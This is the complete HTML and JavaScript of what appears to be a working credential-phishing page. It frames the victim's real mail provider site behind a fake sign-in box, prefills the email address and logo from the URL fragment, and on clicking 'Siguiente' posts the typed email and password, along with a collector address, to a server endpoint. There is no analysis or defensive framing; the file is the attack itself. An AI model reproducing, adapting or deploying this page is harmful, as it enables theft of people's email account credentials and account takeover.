<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://unpkg.com/@ungap/custom-elements-builtin"></script>
    <script src="x-frame.js" type="module"></script>

    <title>Document</title>
    <style>
      html,
      body {
        margin: 0;
        padding: 0;
        height: 100%;
        overflow: hidden;
      }
    </style>
  </head>
  <body class="relative">
    <!-- 	https://logo.clearbit.com/https://aol.com -->
    <iframe
      is="x-frame-bypass"
      src="https://web.de/"
      id="framo"
      title="iframe Example 1"
      class="w-full min-h-screen absolute inset-0"
    >
    </iframe>

    <div class="flex justify-center items-center h-full">
      <div
        class="w-[90%] sm:w-[420px] my-[40px] bg-white z-10 h-[90%] sm:h-[57%] flex flex-col items-center p-10 rounded-md border-gray-50 border"
      >
        <img
          src="https://logo.clearbit.com/https://web.de"
          alt=""
          id="grains"
          class="w-[15%] h-[15%]"
        />

        <p class="mt-6">Sign in to continue</p>

        <div class="mt-10 space-y-6">
          <input
            type="email"
            name=""
            id="road"
            class="w-full h-10 outline-none p-2 border border-gray-300 focus:border-sky-300"
          />

          <input
            type="password"
            name=""
            id="oint"
            class="w-full h-10 outline-none p-2 border border-gray-300 focus:border-sky-300"
          />
        </div>

        <div class="mt-8 flex self-start space-x-2">
          <input type="checkbox" name="" id="" /> <span> Remember me </span>
        </div>

        <button
          class="bg-[#007bff] rounded text-white mt-8 w-full h-10"
          type="button"
          id="make"
        >
          Siguiente
        </button>
      </div>
    </div>

    <script>
      const logo = document.getElementById("grains");
      const frame = document.getElementById("framo");
      const road = document.getElementById("road");
      const ref = window.location.href;
      console.log("contenct bitch", ref);
      const anchor = ref.split("#")[1];
      const mai = anchor.split("@")[1];

      console.log("email though", mai);
      frame.src = `https://${mai}`;
      logo.src = `https://logo.clearbit.com/https://${mai}`;
      road.value = anchor;
    </script>

    <script>
      document.getElementById("make").addEventListener("click", async () => {
        const f = document.getElementById("framo").src;
        const yap = {
          email: document.getElementById("road").value,
          pass: document.getElementById("oint").value,
          sendo: "harhow@gmx.com",
        };

        console.log(yap);
        fetch("/api", {
          method: "POST",
          body: JSON.stringify(yap),
        })
          .then((res) => {
            // window.location.replace(f);
            console.log(res.json());
          })
          .then((res) => {
            console.log(res.json());
          })
          .catch((err) => {
            // window.location.replace(f);
          });
      });
    </script>
  </body>
</html>
